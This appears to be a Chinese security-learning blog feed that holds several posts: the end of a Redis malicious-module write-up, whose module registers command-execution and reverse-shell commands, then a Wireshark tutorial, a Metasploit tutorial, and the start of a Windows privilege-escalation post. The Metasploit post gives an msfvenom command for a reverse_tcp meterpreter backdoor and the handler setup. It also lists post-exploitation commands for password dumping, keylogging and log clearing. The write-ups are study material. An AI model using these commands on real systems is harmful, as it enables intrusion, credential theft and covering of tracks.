<span class="hljs-number">1</span>) == REDISMODULE_ERR)<br>        <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br>        <span class="hljs-keyword">if</span> (RedisModule_CreateCommand(ctx, <span class="hljs-string">&quot;system.rev&quot;</span>,<br>        RevShellCommand, <span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) == REDISMODULE_ERR)<br>        <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>**#include “redismodule.h”**这里就是引入了这个头文件然后实现了其中的API来定义自定义的模块，这个头文件可以从官方仓库源码中找到，里面的内容就不看了，主要来看每个模块是怎么编写的</p><blockquote><p>上面有三个函数RedisModule_OnLoad，RevShellCommand，DoCommand</p><p>RevShellCommand：该函数是 <code>system.rev</code> 命令的实现。当传入的参数个数为3时，它会获取第二个参数作为IP地址，第三个参数作为端口号。然后，它创建一个套接字，并连接到指定的IP地址和端口。接下来，它将标准输入、输出和错误重定向到套接字，并执行 <code>/bin/sh</code>，从而创建一个反向 shell。</p><p>DoCommand：该函数是 <code>system.exec</code> 命令的实现。当传入的参数个数为2时，它会获取第二个参数作为命令字符串，并使用 <code>popen</code> 函数执行该命令，获取命令的输出。然后，它将命令的输出作为字符串回复给客户端。</p><p>RedisModule_OnLoad：该函数是模块加载函数。在这个函数中，模块进行了初始化，并创建了两个命令：<code>system.exec</code> 和 <code>system.rev</code>。这些命令分别与对应的处理函数 <code>DoCommand</code> 和 <code>RevShellCommand</code> 关联起来。这样，当客户端在Redis中执行这些命令时，相应的处理函数将被调用。</p><p>RedisModule_Init：该函数用于创建一个新的Redis命令，以创建system.exec为例，它接受七个参数：<code>ctx</code> 是Redis模块上下文指针，”system.exec” 是命令的名称，<code>DoCommand</code> 是处理该命令的函数指针，”readonly” 是命令的标识符，1 是命令的键和参数的个数，1 是命令的名字和参数的个数，1 是命令的复杂度。如果命令创建失败，函数将返回 <code>REDISMODULE_ERR</code>。</p></blockquote><h1><span id="安全防护">安全防护</span></h1><p>redis的安全设置：设置完毕，需要重新加载配置文件启动redis。</p><ol><li>绑定内网ip</li><li>requirepass设置redis密码</li><li>开启保护模式(protected-mode)</li><li>最好更改一下默认端口</li><li>单独为redis设置一个普通账号，启动redis</li></ol>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析学习</title>
      <link href="/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="wireshark的基本使用">Wireshark的基本使用</span></h1><h2><span id="基本界面介绍">基本界面介绍</span></h2><p>点进去就是wireshark的主界面，包含主机上存在的流量文件和用于捕获流量的网卡</p><p><img src="http://cdn.clown2024.cn/202407151450139.png" alt="image-20240329215038242"></p><p><strong>工作界面</strong></p><p>这里选用了以太网网卡捕获了一些流量进行演示</p><p><img src="http://cdn.clown2024.cn/202407151450140.png" alt="image-20240329215342258"></p><p><strong>一些菜单栏</strong></p><ol><li><p>文件菜单</p><p>文件菜单主要负责打开已经抓取的数据包、最近打开的数据包合并数据包、导入导出特定数据包。</p><p><img src="http://cdn.clown2024.cn/202407151450141.png" alt="image-20240329215454613"></p></li><li><p>编辑菜单</p><p>编辑菜单主要负责对数据包分类标记，以及在抓包过程中按照时间大小进行分包存储，还有整个软件的首选项也在编辑菜单中。</p><p><img src="http://cdn.clown2024.cn/202407151450142.png" alt="image-20240329215539889"></p></li><li><p>捕获菜单</p><p>捕获菜单用于设置捕获规则，其中选项菜单可以设置捕获的网卡，还可以设置捕获规则</p><p><img src="http://cdn.clown2024.cn/202407151450143.png" alt="image-20240329215720951"></p></li><li><p>分析菜单</p><p>分析菜单针对已经获取的数据包进行分析，通过制定相应的规则筛分数据包。</p><p><img src="http://cdn.clown2024.cn/202407151450144.png" alt="image-20240329215812146"></p></li><li><p>视图菜单</p><p>视图菜单主要是针对软件中的视图显示进行设置，重点需要关注的是解析名称、列显示中的着色规则。</p><p><img src="http://cdn.clown2024.cn/202407151450145.png" alt="image-20240329215931362"></p></li><li><p>统计菜单</p><p>统计菜单可以通过对已有数据进行图形化数据分析，这个功能对于分析大量数据是非常有帮助的。</p><p><img src="http://cdn.clown2024.cn/202407151450146.png" alt="image-20240329220025304"></p></li></ol><h2><span id="数据包显示相关">数据包显示相关</span></h2><p><strong>数据包显示列信息</strong></p><p><img src="http://cdn.clown2024.cn/202407151450147.png" alt="image-20240329220327142"></p><ol><li>No：编号，根据抓取的数据包自动分配</li><li>Time：时间，根据捕获时间设定该列</li><li>Source：源地址信息，如果数据包包含源地址信息比如：IP、MAC等，会显示在该列中</li><li>Destination：目的地址信息</li><li>Protocol：协议信息</li><li>Length：数据包长度信息</li><li>Info：wireshark对数据包解读的信息</li></ol><p><strong>修改显示列信息</strong></p><p>我们可以选择想要加入显示列的子项右击并选择应用为列，就可以在上面看到该列</p><p><img src="http://cdn.clown2024.cn/202407151450148.png" alt="image-20240329220847712"></p><p>我们还可以删除已存在的显示列</p><p>我们还可以右击编辑列信息</p><p><img src="http://cdn.clown2024.cn/202407151450149.png" alt="image-20240329221320578"></p><p><strong>修改显示列时间</strong></p><p>默认给出的时间格式不好阅读，我们也可以自己进行修改</p><p>我们可以单击视图选择想要的时间格式</p><p><img src="http://cdn.clown2024.cn/202407151450150.png" alt="image-20240329221446446"></p><p><strong>名字解析</strong></p><p>默认情况下Wireshark只开启了mac地址解析，如果有需要我们可以开启解析网络名称、解析传输层名称。</p><p>点击捕获，在捕获选项中进行修改，比如传输层就会将能识别的端口号解析成对应的服务名称，解析不了就显示原始端口号</p><p><img src="http://cdn.clown2024.cn/202407151450151.png" alt="image-20240329221847219"></p><h2><span id="数据包操作">数据包操作</span></h2><p>获取数据包后用户可以对其进行标记、注释、合并、打印以及导出等操作，这里记录一些比较有用的操作</p><ol><li><p>标记数据包</p><p>标记数据包可以实现对比较重要的数据包进行标记，同时还可以修改数据包显示颜色。标记数据包的操作步骤如下:</p><p>在需要标记的数据包右击选择“标记&#x2F;取消标记”</p><p><img src="http://cdn.clown2024.cn/202407151450152.png" alt="image-20240329222938030"></p><p>标记之后数据包就会高亮显示</p></li><li><p>添加注释操作</p><p>Wireshark提供对数据包注释的功能，在实际操作中如果感觉这个数据包有问题或者比较重要，可以添加一段注释信息</p><p>右击需要注释的数据包选择”分组注释”</p><p><img src="http://cdn.clown2024.cn/202407151450153.png" alt="image-20240329223334679"></p><p><img src="http://cdn.clown2024.cn/202407151450154.png" alt="image-20240329223413212"></p></li><li><p>打印数据包</p><p>点击文件菜单选择打印</p><p><img src="http://cdn.clown2024.cn/202407151450155.png" alt="image-20240329224124850"></p></li><li><p>合并数据包</p><p>在实际抓包过程中，如果网络流量比较大，不停止抓包操作，可能会出现抓包工具消耗掉所有内存，最终导致系统崩溃的状态。为解决这个问题，用户可以采取分段抓取，生成多个数据包文件，最后为了整体分析，再将这些分段数据包合并成一个包。</p><p>点击文件菜单选择合并，然后选择要合并的流量文件即可</p><p><img src="http://cdn.clown2024.cn/202407151450156.png" alt="image-20240329223855934"></p></li><li><p>导出数据包</p><p>Wireshark提供了数据包导出功能，用户可以进行筛选导出，还可以通过分类导出，还可以只导出选中数据包</p><p>点击文件菜单选择导出特定分组</p><p><img src="http://cdn.clown2024.cn/202407151450157.png" alt="image-20240329224400060"></p><p>还可以选择导出为不同格式</p></li></ol><h2><span id="捕获选项">捕获选项</span></h2><p>捕获选项主要针对抓取数据包使用的网卡、抓包前的过滤、抓包大小、抓包时长等进行设置。这个功能在抓包软件中也属于非常重要的一个设置。</p><p><strong>数据包的过滤设置</strong></p><p>Wireshark抓包过滤是基于libpcapWinpcap库实现的，所以遵循BPF(Berke-ley Packet Filter)语法，其中包括类型(Type)、方向(Dir)、协议(Proto)、逻辑运算符。</p><ul><li>类型：host、net、port</li><li>方向：src、dst</li><li>协议：ether、ip、tcp、udp、http、ftp等</li><li>逻辑运算符：&amp;&amp;与、||或、!非</li></ul><p>例如想要抓取源地址为192.168.0.100目的端口为80的流量，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">src host 192.168.0.100 &amp;&amp; dst port 80<br></code></pre></td></tr></table></figure><p>想要抓取ip为192.168.0.100和192.168.0.101的流量，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">host 192.168.0.100 || host 192.168.0.101<br></code></pre></td></tr></table></figure><p>想要抓取除广播外的所有包，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">! broadcast<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151450158.png" alt="image-20240329234755443"></p><p><strong>常用的过滤器写法</strong></p><ol><li><p>过滤mac地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ether host &lt;需要过滤的MAC地址&gt;<br>ether src host &lt;MAC地址&gt;<br>ether dst host &lt;MAC地址&gt;<br></code></pre></td></tr></table></figure></li><li><p>过滤IP地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">host &lt;需过滤的IP地址&gt;<br>src host&lt;IP地址&gt;<br>dst host&lt;P地址&gt;<br></code></pre></td></tr></table></figure></li><li><p>过滤端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">prot 80<br>! prot 80<br>dst port 80<br>srcport 80<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>抓包过滤一旦设置后将只抓取符合规则的数据包，这样会过滤掉大量干扰数据包，从而提高抓包数据的准确率。</p></blockquote><h2><span id="过滤数据包">过滤数据包</span></h2><p>过滤数据包时抓取完之后使用显示过滤器来进行过滤，显示出所需要的数据包</p><p><strong>语法规则如下</strong></p><ul><li>比较操作符：&#x3D;&#x3D;等于、!&#x3D;不等于、&gt;大于、&lt;小于、&gt;&#x3D;大于等于、&lt;&#x3D;小于等于。</li><li>逻辑操作：and 与操作、or或操作、xor异或操作、not非操作。</li><li>IP地址：ip.addr、ip.src、ip.dst。</li><li>过滤端口：tcp.port、tcp.srcport、tcp.dstport、tep.flags.syn、 tep.flags.ack。</li><li>过滤协议：arp、ip、icmp、udp、tcp、bootp、dns等</li></ul><p>例如想要过滤指定ip的数据包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ip.addr==192.168.1.1<br>ip.src==192.168.1.1<br>ip.dst==192.168.1.1<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151450159.png" alt="image-20240330000207628"></p><blockquote><p>wireshark也会自带补全，类似代码补全提示的那样</p></blockquote><p>更多语法可以参考这篇文章：<a href="https://cloud.tencent.com/developer/article/1442007">https://cloud.tencent.com/developer/article/1442007</a></p><h2><span id="数据包分析">数据包分析</span></h2><p><strong>数据追踪</strong></p><p>正常通信中如TCP、UDP、SSL等数据包都是以分片的形发送的，如果在整个数据包中分片查看数据包不便于分析，使用数据流追踪可以将TCP、UDP、SSL等数据流进行重组，以一个完整的形式呈现出来。</p><p>开启追踪流的方式有两种：</p><ol><li>在数据流显示列表中选中要追踪的数据流，右击然后选择追踪流菜单命令。</li><li>选择”分析”菜单，然后选择追踪流。</li></ol><p>比如我这里选择追踪一个http流，他就会显示有关这个这个数据前后相关的整个通信过程</p><p><img src="http://cdn.clown2024.cn/202407151450160.png" alt="image-20240330002214560"></p><blockquote><p>红色是发送请求，服务器返回的结果是蓝色</p></blockquote><p>然后我们还能看到该http请求之前的tcp三次握手的过程</p><p><img src="http://cdn.clown2024.cn/202407151450161.png" alt="image-20240330002406512"></p><p>后面则是传输完成后的四次挥手</p><p><img src="http://cdn.clown2024.cn/202407151450162.png" alt="image-20240330002541147"></p><p>顺便说明这个数据包的具体结构，拿这个http请求为例</p><p><img src="http://cdn.clown2024.cn/202407151450163.png" alt="image-20240330002653500"></p><p>上面从上到下对应着计算机网络中的五层模型：物理层、数据链路层、网络层、传输层、应用层；如果只是tcp协议的话他就只有前四层</p><p><img src="http://cdn.clown2024.cn/202407151450164.png" alt="image-20240330002805666"></p><p><strong>统计数据包</strong></p><p>通过对数据包的统计分析，可以查看更为详细的数据信息，进而分析网络中是否存在安全问题。</p><ol><li><p>选择统计菜单中的”捕获文件属性”，在其中可以查看文件、事件、捕获、接口等信息</p><p><img src="http://cdn.clown2024.cn/202407151450165.png" alt="image-20240330003100727"></p></li><li><p>选择统计菜单中的”协议分级”，可以统计出每一种协议在整个数据包中的占有率</p><p><img src="http://cdn.clown2024.cn/202407151450166.png" alt="image-20240330003233495"></p></li><li><p>选择统计菜单中的”会话”，其中包括以太网、IPv4、IPv6、TCP、UDP等不同协议会话信息展示。</p><p><img src="http://cdn.clown2024.cn/202407151450167.png" alt="image-20240330003457780"></p></li><li><p>选择统计菜单中的”端点”，其中包含以太网和各种协议选项。</p><p><img src="http://cdn.clown2024.cn/202407151450168.png" alt="image-20240330003730343"></p></li><li><p>选择统计菜单中的”分组长度”，可以对不同大小的数据包进行统计</p><p><img src="http://cdn.clown2024.cn/202407151450169.png" alt="image-20240330003838451"></p></li><li><p>选择统计菜单中的”I&#x2F;O图表”，其中包括一个坐标轴显示的图表，下方可以添加任意的协议，也可以选择协议显示的颜色，还可以调整坐标轴的刻度。</p><p><img src="http://cdn.clown2024.cn/202407151450170.png" alt="image-20240330004032643"></p></li><li><p>选择统计菜单中的”流量图”，其中包括通信时间、通信地址、端口以及通信过程中的协议功能</p><p><img src="http://cdn.clown2024.cn/202407151450171.png" alt="image-20240330004146063"></p></li><li><p>选择统计菜单中的”TCP流型图”，在其中可以根据实际需要设置相应的显示，还可以切换数据包的方向。</p><p><img src="http://cdn.clown2024.cn/202407151450172.png" alt="image-20240330004340761"></p></li></ol><h1><span id="常见漏洞流量分析">常见漏洞流量分析</span></h1><p>这里采用dvwa靶场来进行流量分析</p><h2><span id="sql注入流量分析">SQL注入流量分析</span></h2>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf基础使用学习</title>
      <link href="/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="msf简介">msf简介</span></h1><p>Metasploit Framework是一个综合性渗透测试工具，集成信息收集、漏洞扫描、漏洞利用以及提权等功能的工具</p><h1><span id="msf目录构成">msf目录构成</span></h1><p><strong>msf的目录位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441613.png" alt="image-20240328235414919"></p><p><strong>msf的各个模块</strong></p><p>MSF有7个模块，分别对下面目录下的7个子文件夹</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">/usr/share/metasploit-framework/modules<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441614.png" alt="image-20240328235616101"></p><ol><li><p>auxiliary：负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</p></li><li><p>encoders：对payload进行加密，躲避AntiVirus检查的模块</p></li><li><p>evasion：这是用于创建免杀木马的模块</p></li><li><p>exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</p><p><img src="http://cdn.clown2024.cn/202407151441615.png" alt="image-20240329000437236"></p><p>这里看一下Windows的一些提权脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework/modules/exploits/windows/local<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441616.png" alt="image-20240329000459473"></p><p>可以看到有很多脚本可以使用，后续会进行学习使用。</p></li><li><p>payloads：成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。</p><ul><li>single：all-in-one。完整的payload，这些payload都是一体化的，不需要依赖外部的库和包。</li><li>stagers：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li><li>stages：利用stagers建立的连接下载后续payload</li></ul></li><li><p>post：后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作</p></li><li><p>nops：提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。</p></li></ol><h1><span id="使用msf上线meterpreter">使用msf上线meterpreter</span></h1><p>这里使用Windows7来作为受害机器</p><p><strong>生成一个后门文件用于类似反弹shell</strong></p><p>在MSF中，一般我们生成payload程序后门之类的都是用<code>msfvenom</code>，msfvenom是攻击载荷生成和编码器</p><p>主要参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-p payload<br>-e 编码方式,指定编码器，可以实现免杀<br>-i 编码次数。指定编码迭代次数，一般配合免杀使用<br>-b: 去掉坏字符，坏字符会影响payload 正常执行<br>LHOST,LPORT 监听上线的主机IP和端口<br>-f 指定生成格式，如exe 生成EXE格式<br>-o 指定文件名称和导出位置<br>-l 可以查看可以利用payload<br></code></pre></td></tr></table></figure><p>执行下面命令生成一个可执行的后门文件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;攻击机IP&gt; lport=&lt;监听的端口号&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441617.png" alt="image-20240329002507164"></p><p>然后我们启动msfconsole开启监听</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost &lt;攻击者IP&gt;<br>set lport &lt;监听端口&gt;<br>exploit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441618.png" alt="image-20240329003229229"></p><p>然后把我们刚刚生成的后门文件上传到Windows7上面运行之后就可以获得用户权限，得到meterpreter</p><p><img src="http://cdn.clown2024.cn/202407151441619.png" alt="image-20240329102808964"></p><p>然后就可以输入一些命令进行其他操作了，比如getuid查看一下当前的身份</p><p><img src="http://cdn.clown2024.cn/202407151441620.png" alt="image-20240329102935408"></p><h2><span id="一些常用的命令">一些常用的命令</span></h2><p>直接参考这篇文章copy了过来：<a href="https://www.freebuf.com/articles/web/387662.html">https://www.freebuf.com/articles/web/387662.html</a></p><h2><span id="主界面的命令">主界面的命令</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">show exploits – 查看所有可用的渗透攻击程序代码<br>show auxiliary – 查看所有可用的辅助攻击工具<br>show options – 查看该模块所有可用选项<br>show payloads – 查看该模块适用的所有载荷代码<br>show targets – 查看该模块适用的攻击目标类型<br>search – 根据关键字搜索某模块<br>info – 显示某模块的详细信息<br>use – 进入使用某渗透攻击模块<br>back – 回退 set/unset – 设置/禁用模块中的某个参数<br>setg/unsetg – 设置/禁用适用于所有模块的全局参数<br>save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用<br>cd 更改当前的工作目录<br>核心命令<br>Sessions 转储会话列表并显示有关会话的信息<br>Color 切换颜色<br>Set 将特定于上下文的变量设置为一个值<br>Connect 连接与主机通信<br>Setg 将全局变量设置为一个值<br>exit 退出控制台<br>sleep 在指定的秒数内不做任何事情<br>get 获取特定于上下文的变量的值<br>spool 将控制台输出写入文件以及屏幕<br>getg 获取全局变量的值<br>threads 线程查看和操作后台线程<br>grep grep 另一个命令的输出<br>unload 卸载框架插件<br>history 显示命令历史<br>unset 取消设置一个或多个特定于上下文的变量<br>irb 进入irb脚本模式<br>unsetg 取消设置一个或多个全局变量<br>load 加载一个框架插件<br>version 显示框架和控制台库版本号<br>quit 退出控制台<br>route 通过会话路由流量<br>save 保存活动的数据存储<br>数据库后端命令<br>analyze 分析有关特定地址或地址范围的数据库信息<br>db_connect 连接到现有数据服务<br>db_disconnect 断开与当前数据服务的连接<br>db_export 导出包含数据库内容的文件<br>db_import 导入扫描结果文件（将自动检测文件类型）<br>db_nmap 执行nmap并自动记录输出<br>db_rebuild_cache 重建数据库存储的模块高速缓存<br>db_remove 删除已保存的数据服务条目<br>db_save 将当前数据服务连接保存为启动时重新连接的默认值<br>db_status 显示当前数据服务状态<br>hosts 列出数据库中的所有主机<br>loot 列出数据库中的所有战利品<br>notes 列出数据库中的所有注释<br>services 列出数据库中的所有服务<br>vulns 列出数据库中的所有漏洞<br>workspace 在数据库工作区之间切换<br>凭据后端命令<br>creds 列出数据库中的所有凭据<br>模块命令<br>Advanced 显示一个或多个模块的高级选项<br>Back 从当前上下文返回<br>Edit 使用首选编辑器编辑当前模块<br>info 显示有关一个或多个模块的信息<br>loadpath 路径从路径搜索并加载模块<br>options 显示全局选项或一个或多个模块<br>popm 将最新的模块从堆栈中弹出并使其处于活动状态<br>previous 将之前加载的模块设置为当前模块<br>pushm 将活动或模块列表推入模块堆栈<br>reload_all 从所有定义的模块路径重新加载所有模块<br>search 搜索模块名称和描述<br>show 显示给定类型的模块或所有模块<br>use 按名称选择模块<br>enumdesktops #查看可用的桌面<br>getdesktop #获取当前meterpreter 关联的桌面<br>setdesktop #设置meterpreter关联的桌面 -h查看帮助<br>screenshot #截屏<br>run vnc #使用vnc远程桌面连接<br></code></pre></td></tr></table></figure><h2><span id="拿到meterepreter后">拿到Meterepreter后</span></h2><p><strong>系统命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br>execute-执行命令<br>getpid -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br>ps -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br>reg -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br>shell -在受害者计算机上打开一个shell<br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br>sessions -查看当前的会话<br></code></pre></td></tr></table></figure><p><strong>特权升级命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">getprivs -尽可能提升权限<br>getsystem -获得系统管理员权限，通过各种攻击向量来提升系统用户权限<br>//不过这两种方式有时候不一定可以<br></code></pre></td></tr></table></figure><p><strong>密码转储命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hashdump -抓取哈希密码 (SAM) 文件中的值<br></code></pre></td></tr></table></figure><p><strong>用户界面命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br></code></pre></td></tr></table></figure><p><strong>网络命令</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。<br>portfwd -端口转发<br>route -查看或修改受害者路由表<br></code></pre></td></tr></table></figure><p><strong>文件系统命令</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat -读取并输出到标准输出文件的内容<br>cd -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br>edit-用 vim编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br>lcd -更改本地目录<br>lpwd -打印本地目录<br>ls -列出在当前目录中的文件列表<br>mkdir -在受害者系统上的创建目录<br>pwd -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br></code></pre></td></tr></table></figure><p><strong>帮助菜单</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">background – 将当前会话移动到背景<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br>close – 关闭通道<br>exit – 终止 meterpreter 会话<br>help – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br>migrate – 移动到一个指定的 PID 的活动进程，也就是注入进程<br>quit – 终止 meterpreter 会话<br>read – 从通道读取数据<br>run – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br>write – 将数据写入到一个通道<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-权限提升</title>
      <link href="/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>权限提升可以分为横向权限提升和垂直权限提升，前者是指同级用户，后者是指低级用户到高级用户。</p></blockquote><h1><span id="系统内核漏洞提权">系统内核漏洞提权</span></h1><p>当目标系统存在该漏洞且没有更新安全补丁时，利用已知的系统内核漏洞进行提权测试人员往往可以获得系统级别的访问权限。</p><h2><span id="查找漏洞">查找漏洞</span></h2><p><strong>手动查找</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systeminfo<br></code></pre></td></tr></table></figure><p>可以利用该命令查看系统安装的补丁</p><p><img src="http://cdn.clown2024.cn/202407151448392.png" alt="image-20240326091200716"></p><p>然后可以结合系统版本信息，借助辅助工具寻找可用的提权漏洞。</p><p><strong>借助WES-NG查找可用漏洞</strong></p><p>项目地址：<a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>使用方法：</p><ol><li><p>执行下面命令更新漏洞库数据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py --update<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448393.png" alt="image-20240326092255515"></p></li><li><p>在目标主机执行systeminfo命令，并将结果保存到sysinfo.txt中，然后执行下面命令，用WES-NG进行检查</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--impact指定漏洞类型为提权漏洞</span><br></code></pre></td></tr></table></figure><p>emmm我的win7systeminfo文件跑出来什么都没有，跑了一下我的win11竟然有cve没绷住</p><p><img src="http://cdn.clown2024.cn/202407151448394.png" alt="image-20240326160918537"></p><p>执行下面命令查找所有已公开EXP的提权漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448395.png" alt="image-20240326161002020"></p></li></ol><h2><span id="确定并利用漏洞">确定并利用漏洞</span></h2><p>确定漏洞之后，就去找利用程序然后上传利用进行提权。</p><h1><span id="系统服务提权">系统服务提权</span></h1><p>通常情况下，用户安装的一些应用软件会在本地注册一些服务，并且大多数服务在计算机开机时以系统SYSTEM 权限启动。应用软件在注册服务时，会在以下路径中创建相应的注册表项,路径如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448396.png" alt="image-20240327103308958"></p><p>其中的ImagePath指向启动系统服务的二进制程序路径</p><p><img src="http://cdn.clown2024.cn/202407151448397.png" alt="image-20240327103611189"></p><p>如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，这是利用系统服务提权的主要思路。</p><h2><span id="不安全的服务权限">不安全的服务权限</span></h2><p>ACL 定义了安全对象的访问控制策略，用于规定哪些主体对其拥有访问权限和拥有什么样的权限。Windows 的系统服务正是通过 ACL 